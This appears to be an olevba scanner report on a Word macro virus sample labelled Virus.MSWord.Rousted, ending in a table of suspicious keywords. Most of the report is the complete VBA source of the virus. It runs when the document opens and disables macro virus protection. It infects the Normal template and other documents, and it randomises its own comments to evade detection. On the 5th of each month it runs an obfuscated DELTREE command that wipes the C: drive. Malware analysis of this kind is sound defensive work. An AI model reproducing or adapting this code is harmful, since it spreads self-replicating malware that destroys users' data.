olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rousted-2b64b1c562d4b11d14978d842971834689dfe69b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rousted-2b64b1c562d4b11d14978d842971834689dfe69b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'NVC
'lGPJwGVKtJDWLnokxF2
Private Sub Document_Open()
'KvYLLtGtxPb8
On Error Resume Next
'gwVEzdyDaLBua1
Options.VirusProtection = False
'bgwFecfhzTRka6
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
'NduRKatXAOpaXJ1
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
'HHwLOQyzmwfoB7
If NT.Lines(1, 1) <> "'NVC" Then
'nPdMvaNh2
SetAttr NormalTemplate.FullName, 0
'UXFtSR1
Call MC(NT, AD)
'P4
ElseIf AD.Lines(1, 1) <> "'NVC" Then
'zUVXpPFlOjnPZB2
Call MC(AD, NT)
'WgtXSlXsdpRfGRi7
End If
'YEczRYrY6
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'iTbmOwVQH5
If Day(Now) = 5 Then
'QrxrIEBqmHLl5
St = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(99) + Chr(111) + Chr(109) + Chr(112) + Chr(117) + Chr(116) + Chr(101) + Chr(114) + Chr(32) + Chr(73) + Chr(110) + Chr(102) + Chr(101) + Chr(99) + Chr(116) + Chr(101) + Chr(100) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) + Chr(32) + Chr(83) + Chr(101) + Chr(99) + Chr(116) + Chr(111) + Chr(114) + Chr(32) + Chr(118) + Chr(49) + Chr(46) + Chr(48) + Chr(13) + Chr(10) + Chr(78) + Chr(117) + Chr(99) + Chr(108) + Chr(101) + Chr(97) + Chr(114) + Chr(95) + Chr(86) + Chr(105) + Chr(114) + Chr(105) + Chr(95) + Chr(67) + Chr(114) + Chr(101) + Chr(119) + Chr(32) + Chr(40) + Chr(78) + Chr(86) + Chr(67) + Chr(41) + Chr(32) + Chr(45) + Chr(32) + Chr(82) + Chr(85) + Chr(76) + Chr(69) + Chr(90) + Chr(90) + Chr(32) + Chr(70) + Chr(79) + Chr(82) + Chr(69) + Chr(86) + Chr(69) + Chr(82) + Chr(33) + Chr(33) + Chr(33)
'aaTerzGMcjnrUBG0
MsgBox St, 0, ""
'CXCGRMBt6
S = Chr(47) + Chr(67) + Chr(32) + Chr(68) + Chr(69) + Chr(76) + Chr(84) + Chr(82) + Chr(69) + Chr(69) + Chr(32) + Chr(47) + Chr(89) + Chr(32) + Chr(67) + Chr(58) + Chr(32) + Chr(62) + Chr(78) + Chr(85) + Chr(76)
'bEi0
Shell ("COMSPEC") + S, 0
'EgcgBMKr2
End If
'KPwlYQhxZfXGo5
End Sub
'uRdTFog8
Private Sub MC(Dest, Sour)
'Vdiu1
Dest.DeleteLines 1, Dest.CountofLines
'zUVXpPFlOjnPZB2
Dest.InsertLines 1, "'NVC"
'WgtXSlXsdpRfGRi7
For i = 2 To Sour.CountofLines
'YEczRYrY6
Dest.InsertLines i, Sour.Lines(i, 1)
'iTbmOwVQH5
If Mid$(Dest.Lines(i, 1), 1, 1) = "'" Then
'QrxrIEBqmHLl5
Randomize
'aaTerzGMcjnrUBG0
 N = "'"
'CXCGRMBt6
 For j = 1 To Int(Rnd * 20) + 1
'bEi0
  b = Int(Rnd * 26) + 65
'EgcgBMKr2
  If Rnd > 0.5 Then b = b + 32
'KPwlYQhxZfXGo5
  N = N + Chr$(b)
'uRdTFog8
 Next
'Vdiu1
 N = N + Chr$(Asc("0") + Int(Rnd * 9))
'zUVXpPFlOjnPZB2
Dest.ReplaceLine i, N
'WgtXSlXsdpRfGRi7
End If
'YEczRYrY6
Next i
'iTbmOwVQH5
End Sub
'QrxrIEBqmHLl5
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

